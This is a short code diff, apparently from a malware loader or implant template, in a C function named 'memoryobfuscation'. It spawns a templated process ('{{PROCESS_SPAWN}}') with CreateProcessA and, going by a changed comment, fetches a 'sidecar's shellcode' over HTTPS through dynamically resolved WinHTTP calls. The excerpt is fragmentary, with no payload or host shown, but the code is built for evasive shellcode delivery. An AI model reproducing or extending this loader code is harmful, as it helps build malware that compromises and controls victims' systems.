@@ -85,10 +85,8 @@ void memoryobfuscation(){
 
     const char* exeName = "{{PROCESS_SPAWN}}";
     size_t bufferSize = 256;
-    //char* result = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize);
     char result[256];
     int idx = 0;
-    //wsprintfA(result, "\"%s\" %lu 0x%p 0x%lx", exeName, pid, textInfo.baseAddress, textInfo.size);
 
     // Copy exeName with quotes:
     result[idx++] = '"';
@@ -125,7 +123,7 @@ void memoryobfuscation(){
 
     if (!CreateProcessA(
         "{{PROCESS_SPAWN}}",
-        result,
+        NULL,
         NULL,
         NULL,
         FALSE,
@@ -138,7 +136,7 @@ void memoryobfuscation(){
         return;
     }
 
-    // build shc array
+    // https fetch sidecar's shellcode
 
     typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
     typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
